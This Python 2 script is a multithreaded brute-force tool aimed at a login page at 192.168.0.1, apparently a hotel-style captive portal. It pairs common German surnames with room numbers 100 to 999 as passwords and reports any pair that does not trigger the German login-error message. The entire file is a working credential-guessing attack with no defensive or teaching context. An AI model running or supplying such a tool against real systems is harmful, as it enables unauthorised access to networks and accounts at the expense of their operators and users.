#!/usr/bin/env python
# coding: utf-8

from __future__ import print_function

from re import compile
from sys import stdout
from threading import Thread
from urllib2 import HTTPError, URLError, urlopen


NUM_THREADS = 4

TARGET = 'http://192.168.0.1/Authenticator.aspx'
POST_TEMPLATE = 'username={username}&password={password}'
ERROR_MSG = 'Falscher Benutzername oder falsches Kennwort!'

NAMES = ['Schmidt', 'Schmitt', 'Mueller', 'Meier', 'Mayer', 'Schulz', 'Schulze']
ROOMS = range(100, 1000)


def probe_range(rooms, names):
    error_matcher = compile(ERROR_MSG)

    for room in rooms:
        for name in names:
            post_data = POST_TEMPLATE.format(username=name, password=room)

            try:
                response = urlopen(TARGET, post_data, timeout=5)
            except HTTPError:
                stdout.write('x')
                stdout.flush()
                continue
            except URLError:
                stdout.write('-')
                stdout.flush()
                continue

            match = error_matcher.search(response.read())
            if not match:
                print('\nFound match: {} :: {}'.format(name, room))
            else:
                stdout.write('.')
                stdout.flush()


if __name__ == '__main__':
    chunk_len = len(ROOMS) / NUM_THREADS

    for chunk_start in xrange(0, len(ROOMS), chunk_len):
        Thread(
            target=probe_range,
            kwargs={
                'rooms': ROOMS[chunk_start:chunk_start+chunk_len],
                'names': NAMES
            }
        ).start()
